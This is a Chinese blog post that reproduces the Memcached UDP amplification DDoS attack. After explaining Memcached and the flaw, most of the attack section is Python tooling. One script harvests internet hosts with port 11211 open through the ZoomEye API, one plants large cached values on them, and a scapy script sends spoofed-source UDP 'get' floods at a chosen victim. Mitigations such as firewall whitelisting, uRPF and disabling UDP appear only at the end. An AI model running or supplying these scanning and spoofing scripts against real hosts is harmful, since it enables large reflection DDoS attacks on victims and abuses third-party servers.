# DDOS核弹攻击--Memcached放大攻击复现

src:https://blog.csdn.net/qq_38780085/article/details/79572830?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control



情景：当有一个Request过来后，Web服务器交给APP服务器，APP处理并从Database中存取相关数据，但Database存取的花费是相当高昂的。特别是每次都取相同的数据，等于是让数据库每次都在做高耗费的无用功。如果APP拿到第一次数据并存到内存里，下次读取时直接从内存里读取，而不用麻烦数据库，并且从内存取数据必然要比从数据库媒介取快很多倍，反而提升了应用程序的性能。Memcached应运而生



### *一、什么是Memcached？*

​    Memcached 是一个高性能的分布式内存对象缓存系统，用于动态Web应用以减轻数据库负载。它通过在内存中缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。



### *二、Memcached服务原理：*

​    Memcache服务器工作机制是在内存中开辟一块空间，然后建立一个基于一个存储键/值对的hashmap。客户端通过对key的哈希算法确定键值对所处的服务器位置，进行查询请求，让它来查询。如果请求的资源是第一次加载被访问，则将在服务器存储（key，value）对和请求的资源并回复，在以后的请求中只需要匹配key即可回复。



### *三、Memcached服务器的安装和启动*

​    安装：在Linux系统中安装：sudo apt-get install memcached

​    启动:(1)service memcached start

​        (2)memcached [options] 方式启动

​                      options：-p TCP监听的端口，默认11211
​                             -U UDP监听的端口，-U 0 禁用UDP服务，默认11211
​                             -l 监听的ip地址, 默认是ADDR_ANY，所有的ip都可以访问
​                             -d start 启动memcached服务
​                             -d restart 重起memcached服务
​                             -d stop|shutdown 关闭正在运行的memcached服务
​                             -d install 安装memcached服务
​                             -d uninstall 卸载memcached服务
​                             -u 以的身份运行 (仅在以root运行的时候有效)
​                             -m 最大内存使用，单位MB。默认64MB
​                             -M 内存耗尽时返回错误，而不是删除项
​                             -c 最大同时连接数，默认是1024
​                             -f 块大小增长因子，默认是1.25-n 最小分配空间，key+value+flags默认是48
​                             -h 显示帮助

​    注意事项：该漏洞是利用UDP转发数据，当你开启服务时最好用netstat -pantu | grep 11211 查看11211端口上是否有两个进程服务一个UDP另一个TCP的服务。在实验中经常发现用service memcached stop启动时，默认开启两条TCP服务，实验不能成功，建议用memcached -p 11211 -U 11211 开启服务，如果不能重复几次。



### *四、管理Memcached服务器存储内容*

​    （1）通过登陆服务器的方式。当你启动Memcached服务器后，可以通过客户端链接端口的方式来访问：telnet 127.0.0.1 11211，这里有一些服务器命令可以帮助你操作memcached服务器存储的（key，value）对以及清空服务器中的缓存数据。

​                get    返回Key对应的Value值
​                add    添加一个Key值，没有则添加成功并提示STORED，有则失败并提示NOT_STORED
​                set    无条件地设置一个Key值，没有就增加，有就覆盖，操作成功提示STORED
​                replace    按照相应的Key值替换数据，如果Key值不存在则会操作失败
​                stats    返回MemCache通用统计信息（下面有详细解读）
​                stats items    返回各个slab中item的数目和最老的item的年龄（最后一次访问距离现在的秒数）
​                stats slabs    返回MemCache运行期间创建的每个slab的信息（下面有详细解读）
​                version    返回当前MemCache版本号
​                flush_all    清空所有键值，但不会删除items，所以此时MemCache依旧占用内存

​          如果想要更多详细的解读，大家可以看看这篇文章：https://www.cnblogs.com/widget90/p/5690373.html

![img](images/20180315203523411)

​    （2）通过编程库函数。当然Memcached也提供了各种语言的库函数方便操作服务器数据，你可以通过编程的方式来访问服务器并执行响应的命令，只不过命令的操作变成了各种函数调用。例如python中可以导入from pymemcache.client.hash import Client/HashClient来实现与服务器交互

​    （3）通过伪造请求。服务器的各种操作可以通过发送特定的数据包，数据包的内容包含各种对服务器的操作命令来实现对服务器的内容存储。下面将主要利用这种方式来实现攻击。



### *五、UDP漏洞原理分析：*

​    该漏洞产生的原因简单来时就是服务器配置漏洞，Memcached服务器默认开启TCP和DUP监听11211端口，并且监听任意IP地址访问。当攻击者伪造源IP进行数据访问时，服务器将请求找到对应的缓存的数据通过UDP数据包的格式发送出去，由于UDP的不可靠性，导致了放大攻击。



### *六、攻击步骤：*

​    （1）首先我们先通过正常的访问，在服务器上设置较大的value，这里我们通过编程的方式来实现，选用TCP协议，应为TCP不但可靠，重要的一点是没有数据长度的限制，UDP数据包在发送的时候默认最大能send 64K的数据，因此选择使用TCP协议。

​    （2）通过伪造源IP的方式对服务器发送数据请求，这样服务器发送较大的数据到我们到攻击的目标主机上了。

  注意事项：Memcached服务器最大的单个key对应的数据大小为1M，因此设置过大的数据将导致失败，本人在局域网实验成功过900K的，如果在设置数据时返回超时请检查：服务器端口是否开启成功最好用nmap扫描一下，其次可以先设置较小的数据测试一下，较大的数据及其容易导致超时。

![img](images/20180315203632703)

​    在设置数据之后：

![img](images/20180315203755873)

### *七、集成化工具编写：* 

​    （1）首先我们可以在互联网上搜索开放11211端口的主机。这里用的是ZoomEye对应的API，该源代码来自http://www.open-open.com/lib/view/open1459334554120.html， 经过稍微修改，就可以发现网络部分开放11211端口的主机。

```python
# coding: utf-8
 
import os
import requests
import json
 
access_token = ''
 
ip_list = []
 
 
def login():
    """
        输入用户米密码 进行登录操作
    :return: 访问口令 access_token
    """
    user = raw_input('[-] input : username :')
 
    passwd = raw_input('[-] input : password :')
 
    data = {
        'username': user,
        'password': passwd
            }
 
    data_encoded = json.dumps(data)  # dumps 将 python 对象转换成 json 字符串
 
    try:
 
        r = requests.post(url='http://api.zoomeye.org/user/login', data=data_encoded)
 
        r_decoded = json.loads(r.text)  # loads() 将 json 字符串转换成 python 对象
 
        global access_token
 
        access_token = r_decoded['access_token']
 
    except Exception, e:
 
        print '[-] info : username or password is wrong, please try again '
 
        exit()
 
 
def saveStrToFile(file, str):
    """
        将字符串写如文件中
    :return:
    """
    with open(file, 'w') as output:
 
        output.write(str)
 
 
def saveListToFile(file, list):
    """
        将列表逐行写如文件中
    :return:
    """
    s = '\n'.join(list)
 
    with open(file, 'w') as output:
 
        output.write(s)
 
 
def apiTest():
    """
        进行 api 使用测试
    :return:
    """
    page = 1
 
    global access_token
 
    with open('access_token.txt', 'r') as input:
 
        access_token = input.read()
    # 将 token 格式化并添加到 HTTP Header 中
    headers = {
        'Authorization': 'JWT ' + access_token,
             }
 
    # print headers
    while (True):
 
        try:
 
            r = requests.get(url='http://api.zoomeye.org/host/search?query="port:11211"&facet=app,os&page=' + str(page),
                             headers=headers)
 
            r_decoded = json.loads(r.text)
 
            # print r_decoded
            # print r_decoded['total']
 
            for x in r_decoded['matches']:
 
                print x['ip']
 
                ip_list.append(x['ip'])
 
            print '[-] info : count ' + str(page * 10)
 
        except Exception, e:
            # 若搜索请求超过 API 允许的最大条目限制 或者 全部搜索结束，则终止请求
            if str(e.message) == 'matches':
 
                print '[-] info : account was break, excceeding the max limitations'
 
                break
            else:
 
                print  '[-] info : ' + str(e.message)
 
        else:
 
            if page == 20:
 
                break
 
            page += 1
 
 
def main():
    # 访问口令文件不存在则进行登录操作
 
    if not os.path.isfile('access_token.txt'):
 
        print '[-] info : access_token file is not exist, please login'
 
    login()
 
    saveStrToFile('access_token.txt', access_token)
 
    apiTest()
 
    saveListToFile('ip_list.txt', ip_list)
 
 
if __name__ == '__main__':
 
    main()

```



​    （2）测试主机是否有漏洞，我们可以先发送一个TCP set一下数据，通过发送UDP get请求判断是否存在漏洞。

针对TCP set的脚本：

```python

# coding: utf-8
 
import socket
import os
import threading
 
# 读取ip_list 发送tcp set
#   成功 保存 set_list.txt
 
def TCP_set(IP,port,var_name,path):
 
    # 创建socket链接
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    client.settimeout(10.0)
 
    try:
 
        client.connect((IP, int(port)))
 
    except Exception,e:
 
        print(IP + "  --------  is fail")
 
        return
 
    # 得到length字段
    length = os.path.getsize(path)
 
    with open(path, 'r') as file:
 
        string = file.read()
 
    # 发送的内容
    data = "set "+var_name+" 1 0 "+str(length)+"\r\n"+string+"\r\n\r\n\r\n\r\n\r\n"
 
    client.send(data)
 
    # 超时
    try:
 
        data = client.recv(1024)
 
    except:
 
        print("  --------  is fail ")
 
        return
 
    else:
 
        if "STORED" in data:
             with open('set_list.txt','w') as outfile:
 
                outfile.write(IP+'\n')
 
        print ( IP+"--------is ok ")
 
    finally:
 
        client.close()
 
 
def Set():
 
    path=raw_input('input the path of target Ip file:')
 
    var_name = raw_input('input the var_name:')
 
    payload = raw_input('input the path of payload file:')
 
    port = raw_input('input the target port:')
 
 
    with open(path,'r') as ips:
 
        for ip in ips:
 
            ip = ip.strip('\n')
	    print ip
            thread = threading.Thread(target=TCP_set, args=(ip,port,var_name,payload))
 
            thread.start()
 
def main():
    Set()
 
if __name__ == '__main__':
    main()
```

针对UDP判断时是否存在漏洞和伪造源IP进行DDOS（判断是否存在漏洞只需要将目标IP设置成自己的即可）：

```python
#!/usr/bin/python
# coding=utf-8
 
from scapy.all import *
import threading
 
screenLock = threading.Semaphore(value=1)
 
global Count
Count = 0
 
 
def UDP_get(target_host, target_port, var_name, src_ip, src_port, count_page):
    global Count
 
    if Count >= count_page:
        print('Atrack is end!')
 
        exit(0)
 
    data = "\x00\x00\x00\x00\x00\x01\x00\x00get " + var_name + "\r\n"
 
    pkt = scapy.all.IP(dst=target_host, src=src_ip) / scapy.all.UDP(sport=src_port, dport=target_port) / data
 
    send(pkt, inter=1, count=1)
 
    screenLock.acquire()
 
    Count = Count + 1
 
    # print("[+] Sending the "+'%d' %Count+" UDP pages")
 
    if Count >= count_page:
        print('Atrack is end!')
 
        exit(0)
 
    screenLock.release()
 
 
def UDP_Attrack(target_host, target_port, var_name, src_ip, src_port, count, count_page):
    global Count
    while (Count <= count_page):
 
        for i in range(count):
            # UDP_get(target_host,target_port,var_name,src_ip,src_port)
 
            th = threading.Thread(target=UDP_get,
                                  args=(target_host, target_port, var_name, src_ip, src_port, count_page))
 
            th.start()
 
 
def main():
  
    target_host = raw_input("target service host:")
 
    
    target_port = raw_input("target service port:")
 
   
    var_name = raw_input("the key name:")
 
    
    src_ip = raw_input("the attrack host:")
 
    
    src_port = raw_input("the attrack port:")
 
    Thread_count = raw_input("the Count of Threading:")
    
 
    Count_page = raw_input("the Count of page:")
   
 
    UDP_Attrack(target_host, int(target_port), var_name, src_ip, int(src_port), int(Thread_count), int(Count_page))
 
```



​    （3）对存在漏洞的主机伪造源IP实现DDOS。

​    注意事项：这里使用scapy伪造UDP请求判断是否存在漏洞时，需要对接收到的数据进行判断，因为代码里有些许错误，一直没有改正，这里就给大家提供些思路，同时Scapy在Windows上Python 2.7的环境下不能安装，在Linux上运行出现好多问题，optparse模块也一直不能运行，这里只能用raw_input代替。



攻击成果展示：

![img](images/20180315205301144)



### *八、Memcached服务器针对DDOS的防御策略：* 

​    （1）设置访问控制规则：白名单
​      利用防火墙控制对访问ip的限制，只允许白名单内的ip进行端口访问，在Linux环境中运行命令iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT，在iptables中添加此规则只允许192.168.0.2这个IP对11211端口进行访问。

​    （2）修改默认端口
​      修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid

​    （3）URPF（Unicast Reverse Path Forwarding，单播逆向路径转发）
​      主要功能是用于方式基于源地址欺骗的网络攻击行为。路由器接口一旦是使用URPF功能，当该接口受到数据报文时，首先会对数据报文的源地址进行合法性检查，对于源地址合法性通过的报文，才会进行进一步去找往目的地的地址进行转发，进行报文转发流程，否则将丢弃报文。

​    （4）启动认证功能

​      Memcached本身没有做验证访问模块，但是从Memcached1.4.3版本开始，能支持SASL认证。

​    （5）禁用UDP转发功能

​      在开启服务器时，加上-U 0 禁止UDP端口的开放，即可实现被别人利用。



### *九、补充：*

​    （1）Memcached服务器DDOS漏洞主要时利用了UDP的不可靠性，无法对源IP进行识别。与之相类似的就时DNS，DNS服务器也经常被当作发达攻击的跳板，但是放大的备注只能时2-5倍，原因就是DNS发送数据时首先采用UDP，攻击者就是利用了这个原理，才能进行放大攻击。但是却不能像memcached放大50000多倍，原因是DNS发现将要发送的数据过大时，将采用TCP发送，这样能杜绝IP欺骗，我认为Memcached也可以采用类似反应机制实现自身安全。

​    （2）在学习的过程中发现在操作Memcached服务命令中的flush_all命令也可能存在安全隐患，该命令是清空服务器缓存，如果攻击者一直伪造发送该指令的数据包，将严重影响动态WEB网站资源的加载速度，读写过多可能会严重影响硬件本身的功能。